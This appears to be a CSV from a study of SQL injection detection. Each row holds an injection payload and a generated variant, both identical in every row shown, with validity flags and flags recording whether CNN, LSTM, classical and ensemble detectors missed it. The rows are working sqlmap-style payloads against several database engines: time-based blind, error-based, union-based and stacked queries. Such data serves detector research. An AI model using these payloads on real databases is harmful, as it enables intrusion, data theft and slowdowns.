,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1725,"1'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","1'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,1,0,0,0,0,0
1726,"1"")));begin user_lock.sleep(5); end and (((""revx""=""revx","1"")));begin user_lock.sleep(5); end and (((""revx""=""revx",1,1,0,0,0,0,0
1727,"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)","1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",1,1,0,0,0,0,0
1728,"1"" and 4996=4431 and ""jzaq""=""jzaq","1"" and 4996=4431 and ""jzaq""=""jzaq",1,1,0,0,0,0,0
1729,1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('jzpb'='jzpb,1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('jzpb'='jzpb,1,1,0,0,0,0,0
1730,"1"");select benchmark(5000000,md5(0x714e4153))#","1"");select benchmark(5000000,md5(0x714e4153))#",1,1,0,0,1,0,0
1731,"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv","1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv",1,1,0,0,0,0,0
1732,1') as epgz where 2898=2898 and 7028=2287#,1') as epgz where 2898=2898 and 7028=2287#,1,1,0,0,0,0,0
1733,"-9057"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-9057"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
1734,1') where 3187=3187 order by 1#,1') where 3187=3187 order by 1#,1,1,0,0,0,0,0
1735,"1%"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""%""=""","1%"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""%""=""",1,1,0,0,0,0,0
1736,"-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#","-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1,1,0,0,0,0,0
1737,"-4746%""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""","-4746%""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",1,1,0,0,0,0,0
1738,1'||(select 'xglm' from dual where 3556=3556 or 4240=(select 4240 from pg_sleep(5))--,1'||(select 'xglm' from dual where 3556=3556 or 4240=(select 4240 from pg_sleep(5))--,1,1,0,0,0,0,0
1739,1)) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((1260=1260,1)) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((1260=1260,1,1,0,0,0,0,0
1740,"1"" where 2989=2989 or 8421=(select count(*) from generate_series(1,5000000))--","1"" where 2989=2989 or 8421=(select count(*) from generate_series(1,5000000))--",1,1,0,0,0,0,0
1741,"-5386') union all select 8026,8026,8026,8026,8026,8026#","-5386') union all select 8026,8026,8026,8026,8026,8026#",1,1,0,0,0,0,0
1742,"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'usnh' like 'usnh","1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'usnh' like 'usnh",1,1,0,0,0,0,0
1743,"1,(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))","1,(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",1,1,0,0,0,0,0
1744,"1%""))) union all select null--","1%""))) union all select null--",1,1,0,0,0,0,0
1745,"1'||(select 'kbvq' where 9279=9279 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'","1'||(select 'kbvq' where 9279=9279 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",1,1,0,0,0,0,0
1746,"1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy","1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy",1,1,0,0,0,0,0
1747,"-4770))) union all select 6356,6356,6356,6356,6356#","-4770))) union all select 6356,6356,6356,6356,6356#",1,1,0,0,0,0,0
1748,"1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
1749,"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""gydr"" like ""gydr","1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""gydr"" like ""gydr",1,1,0,0,1,0,0
1750,"1"") union all select null,null--","1"") union all select null,null--",1,1,0,0,0,0,0
1751,"1"")) as swix where 2459=2459 or 8466=benchmark(5000000,md5(0x694a4745))--","1"")) as swix where 2459=2459 or 8466=benchmark(5000000,md5(0x694a4745))--",1,1,0,0,0,0,0
1752,1) where 2199=2199 or (select * from (select(sleep(5)))ydpu)--,1) where 2199=2199 or (select * from (select(sleep(5)))ydpu)--,1,1,0,0,1,0,0
1753,"1%' and elt(4249=4249,7259) and '%'='","1%' and elt(4249=4249,7259) and '%'='",1,1,0,0,0,0,0
1754,"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('qgrt'='qgrt","1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('qgrt'='qgrt",1,1,0,0,0,0,0
1755,"-8454"" or 6872=6872","-8454"" or 6872=6872",1,1,0,0,0,0,0
1756,"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'vvkl'='vvkl","1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'vvkl'='vvkl",1,1,0,0,0,0,0
1757,"1"") as ucex where 5148=5148 order by 1#","1"") as ucex where 5148=5148 order by 1#",1,1,0,0,0,0,0
1758,"1',(case when 2872=2872 then 1 else null end)","1',(case when 2872=2872 then 1 else null end)",1,1,0,0,0,0,0
1759,1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1,1,0,0,0,0,0
1760,"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('txwf'='txwf","1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('txwf'='txwf",1,1,0,0,0,0,0
1761,"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--","1%')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,1,0,0
1762,"1') as yxdb where 4597=4597;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","1') as yxdb where 4597=4597;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",1,1,0,0,0,0,0
1763,"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""wrbs"" like ""wrbs","1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""wrbs"" like ""wrbs",1,1,0,0,0,0,0
1764,"1'+(select ocvc where 6981=6981 union all select null,null,null,null,null,null,null,null,null,null#","1'+(select ocvc where 6981=6981 union all select null,null,null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
1765,"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,1,0,0,0,0,0
1766,"1'+(select vohg where 6383=6383 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'","1'+(select vohg where 6383=6383 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'",1,1,0,0,0,0,0
1767,"1%"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""","1%"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",1,1,0,0,0,0,0
1768,"1"");if(3831=9321) select 3831 else drop function ybru--","1"");if(3831=9321) select 3831 else drop function ybru--",1,1,0,0,0,0,0
1769,"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""gmld"" like ""gmld","1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""gmld"" like ""gmld",1,1,0,0,0,0,0
1770,"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'='qjle","1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'='qjle",1,1,0,0,0,0,0
1771,1%';(select * from (select(sleep(5)))srmq) and '%'=',1%';(select * from (select(sleep(5)))srmq) and '%'=',1,1,0,0,0,0,0
1772,"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""qkds"" like ""qkds","1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""qkds"" like ""qkds",1,1,0,0,0,0,0
1773,"1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu","1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu",1,1,0,0,1,0,0
1774,"1"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","1"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,1,0,0,1,0,0
1775,-1386') or (7880=5362)*5362 and ('vsyu' like 'vsyu,-1386') or (7880=5362)*5362 and ('vsyu' like 'vsyu,1,1,0,0,0,0,0
1776,1' in boolean mode) and sleep(5)#,1' in boolean mode) and sleep(5)#,1,1,0,0,0,0,0
1777,"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('wzdo'='wzdo","1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('wzdo'='wzdo",1,1,0,0,0,0,0
1778,"1%""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1%""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
1779,-5962)) as jbqv where 2583=2583 or 7496=8560--,-5962)) as jbqv where 2583=2583 or 7496=8560--,0,1,0,0,0,0,0
1780,"1');select benchmark(5000000,md5(0x4c4d6142)) and ('qfsu'='qfsu","1');select benchmark(5000000,md5(0x4c4d6142)) and ('qfsu'='qfsu",1,1,0,0,0,0,0
1781,1' rlike (select (case when (6855=1056) then 1 else 0x28 end)) and 'pmrz' like 'pmrz,1' rlike (select (case when (6855=1056) then 1 else 0x28 end)) and 'pmrz' like 'pmrz,1,1,0,0,0,0,0
1782,"1"";select (case when (1354=7529) then 1354 else cast(1 as int)/(select 0 from dual) end) from dual--","1"";select (case when (1354=7529) then 1354 else cast(1 as int)/(select 0 from dual) end) from dual--",1,1,0,0,0,0,0
1783,"-6720'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('enfe' like 'enfe","-6720'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('enfe' like 'enfe",1,1,0,0,0,0,0
1784,1'+(select goec where 9460=9460 rlike (select (case when (4740=1203) then 1 else 0x28 end)))+',1'+(select goec where 9460=9460 rlike (select (case when (4740=1203) then 1 else 0x28 end)))+',1,1,0,0,0,0,0
1785,1 where 8102=8102 and 9198=9198--,1 where 8102=8102 and 9198=9198--,0,1,0,0,0,0,0
1786,"1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--","1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
1787,"1') and elt(5245=9203,9203) and ('fhlw' like 'fhlw","1') and elt(5245=9203,9203) and ('fhlw' like 'fhlw",1,1,0,0,0,0,0
1788,"-1573"") union all select 3928,3928,3928,3928--","-1573"") union all select 3928,3928,3928,3928--",1,1,0,0,0,0,0
1789,"1) where 7748=7748 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","1) where 7748=7748 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,1,0,0,0,0,0
1790,"1%"" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ""%""=""","1%"" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ""%""=""",1,1,0,0,0,0,0
1791,"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('zypa'='zypa","1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('zypa'='zypa",1,1,0,0,0,0,0
1792,1')) and (5091=8681)*8681 and (('xevm'='xevm,1')) and (5091=8681)*8681 and (('xevm'='xevm,1,1,0,0,0,0,0
1793,"-7559"" or 8792=6905--","-7559"" or 8792=6905--",1,1,0,0,0,0,0
1794,"1"") as piwi where 2918=2918;(select * from (select(sleep(5)))acdk)#","1"") as piwi where 2918=2918;(select * from (select(sleep(5)))acdk)#",1,1,0,0,1,0,0
1795,"1%"")) and (7817=4371)*4371 and ((""%""=""","1%"")) and (7817=4371)*4371 and ((""%""=""",1,1,0,0,0,0,0
1796,"-5150))) union all select 5660,5660,5660#","-5150))) union all select 5660,5660,5660#",1,1,0,0,0,0,0
1797,1');select (case when (9130=1826) then 9130 else 9130*(select 9130 from mysql.db) end)#,1');select (case when (9130=1826) then 9130 else 9130*(select 9130 from mysql.db) end)#,1,1,0,0,0,0,0
1798,"-7258"") as wjjr where 2110=2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--","-7258"") as wjjr where 2110=2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",1,1,0,0,0,0,0
1799,1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,1,0,0,0,0,0
1800,"1') and elt(7554=6257,6257) and ('bpzm'='bpzm","1') and elt(7554=6257,6257) and ('bpzm'='bpzm",1,1,0,0,0,0,0
1801,"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""rurz""=""rurz","1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""rurz""=""rurz",1,1,0,0,0,0,0
1802,"1%"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""%""=""","1%"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""%""=""",1,1,0,0,0,0,0
1803,"-5169"")) union all select 6198,6198,6198,6198--","-5169"")) union all select 6198,6198,6198,6198--",1,1,0,0,0,0,0
1804,1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#,1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#,1,1,0,0,1,0,0
1805,"1%';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","1%';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,1,0,0,1,0,0
1806,"-4304' where 1005=1005 union all select 1005,1005#","-4304' where 1005=1005 union all select 1005,1005#",1,1,0,0,0,0,0
1807,1 where 7299=7299 rlike sleep(5)--,1 where 7299=7299 rlike sleep(5)--,0,1,0,0,0,0,0
1808,"-6883"") as tbai where 8121=8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--","-6883"") as tbai where 8121=8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1,1,0,0,0,0,0
1809,1))) union all select null#,1))) union all select null#,1,1,0,0,0,0,0
1810,-2573)) order by 1#,-2573)) order by 1#,0,1,0,0,0,0,0
1811,1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('nxkp' like 'nxkp,1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('nxkp' like 'nxkp,1,1,0,0,0,0,0
1812,"1' where 3700=3700 union all select null,null,null--","1' where 3700=3700 union all select null,null,null--",1,1,0,0,0,0,0
1813,"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('%'='","1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('%'='",1,1,0,0,0,0,0
1814,"-4927')) union all select 1924,1924#","-4927')) union all select 1924,1924#",1,1,0,0,0,0,0
1815,"-6505')) as jtnp where 1037=1037 or elt(1032=1032,3623)--","-6505')) as jtnp where 1037=1037 or elt(1032=1032,3623)--",1,1,0,0,0,0,0
1816,"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""tlpw""=""tlpw","1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""tlpw""=""tlpw",1,1,0,0,0,0,0
1817,"1')) as arhm where 3268=3268 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","1')) as arhm where 3268=3268 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1,1,0,0,1,0,0
